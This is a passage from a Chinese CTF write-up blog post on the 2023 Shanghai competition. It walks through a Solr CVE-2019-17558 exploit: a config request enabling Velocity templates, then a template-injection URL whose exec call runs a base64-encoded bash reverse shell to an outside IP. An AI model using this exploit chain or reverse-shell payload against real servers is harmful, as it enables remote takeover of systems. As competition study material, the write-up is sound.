+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XD8C2VOKEU</span><br><span class="line">-&gt; flag&#123;d580cc00-e489-467e-882b-1c340560533a&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="easy-log"><a href="#easy-log" class="headerlink" title="easy_log"></a>easy_log</h2><p>URL：<code>/log/f38778dcd7cad24a4d8d92242ba4b9b6/202305/20.php</code> </p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">123: 202cb962ac59075b964b07152d234b70</span><br><span class="line">321: caf1a3dfb505ffed0d024130f58c5cfa</span><br><span class="line">123: 202cb962ac59075b964b07152d234b70</span><br><span class="line">321: caf1a3dfb505ffed0d024130f58c5cfa</span><br></pre></td></tr></table></figure></div>
+
+<p>始终相等，没有随机盐</p>
+<h2 id="漏洞挖掘场景4"><a href="#漏洞挖掘场景4" class="headerlink" title="漏洞挖掘场景4"></a>漏洞挖掘场景4</h2><p>需要利用CVE实现RCE <a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/youthbelief/article/details/121083848" >solr 远程命令执行 (CVE-2019-17558) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>已知环境中开着四个cores，利用test1打开模板开关：</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/test1/config</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>10.103.153.63:8983</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>rememberMe=ZrWSOx/f1eB8kMCUxBKVtpvavMAcnzYhOV12brxMjtGhkKQn5c4s7ebXkSK3L2h2xsHd1X6/dsnPxexTbyDyUu9iX9f1VZ4nzzw0JHvqBIvE++K6sQvy5zQQwTrV01QD63ixjVF6X7UnJffNxBo7PFXIPox+3el8hn5iyyrEgPKerTpiVCzZvejQYX3+Jw5mZyB37u1i7HkayHi2xKhqyAILpQIc3IC/c7ttiyRtb7vZrrxcUcxg9usK6KH4+4r79MZAbve+5WyprSv5FjmuUAISVnmYb+jFB60Lj5/DBMDhqh76I3+u2/v05xCHPY5yPR7uOyIkKJW5V4Eevn3a4oX0DIbR16m+bUhu9mimNcbGXaQMGXpEBOs6zo9RZabRhG15/Pa0ILRrlsydVkLQQ7oIRSHb6xlVvh3lcwyVnnxKeEcl8e3fv4Fi8b0Gy3ceJQVD3PM+Xt1nOsBryIj2BBxscyEk1oq7AmL/pLAmow5Jpq+WC6OzSY7kAsLkI/9k; JSESSIONID=DD1A8B91F1B2FB55E5513FD495DCF51E; PHPSESSID=vuepd29fdnl0h1sed6lrg8nea1; ADMINCONSOLESESSION=EFzGRVL02XWVtpKgizObGYq823nJwosV50EHY1W6OGTj5BKqBElL!-1101485479; -http-session-=4::http.session::f35ab9c4d2b3ff41989f7c9b68125358; Hm_lvt_deaeca6802357287fb453f342ce28dda=1635738037; Hm_lpvt_deaeca6802357287fb453f342ce28dda=1635738037</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>259</span><br><span class="line"></span><br><span class="line"><span class="language-n1ql">&#123;</span></span><br><span class="line"><span class="language-n1ql">  &quot;<span class="keyword">update</span>-queryresponsewriter<span class="string">&quot;: &#123;</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">    &quot;</span>startup<span class="string">&quot;: &quot;</span>lazy<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">    &quot;</span>name<span class="string">&quot;: &quot;</span>velocity<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">    &quot;</span>class<span class="string">&quot;: &quot;</span>solr.VelocityResponseWriter<span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">    &quot;</span>template.base.dir<span class="string">&quot;: &quot;</span><span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">    &quot;</span>solr.resource.loader.enabled<span class="string">&quot;: &quot;</span><span class="literal">true</span><span class="string">&quot;,</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">    &quot;</span>params.resource.loader.enabled<span class="string">&quot;: &quot;</span><span class="literal">true</span><span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">  &#125;</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-n1ql"></span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>随后即可实现RCE：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.103.153.63:8983/solr/test1/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27bash%20%2Dc%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC84MS42OS4yMjcuMjA0LzIzMzMzIDA%2BJjEgMj4mMQ%3D%3D%7D%7C%7Bbase64%2C%2Dd%7D%7C%7Bbash%2C%2Di%7D%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure></div>
+
+<p>反弹shell后即可得到flag。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://picturebed-1310517892.file.myqcloud.com/image-20230522221527402.png"
+                      alt="image-20230522221527402"
+                ></p>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2023上海市赛——PSXD</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2023-05-31 01:20:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-05-31 01:20:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2023/05/31/Security/CTF/2023上海市赛——PSXD/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">2023上海市赛——PSXD</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bird"><span class="nav-text">Bird</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezpython"><span class="nav-text">ezpython</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#comlicated-http"><span class="nav-text">comlicated http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cookieback"><span class="nav-text">Cookieback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#good-http"><span class="nav-text">good_http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-log"><span class="nav-text">easy_log</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%9C%BA%E6%99%AF4"><span class="nav-text">漏洞挖掘场景4</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
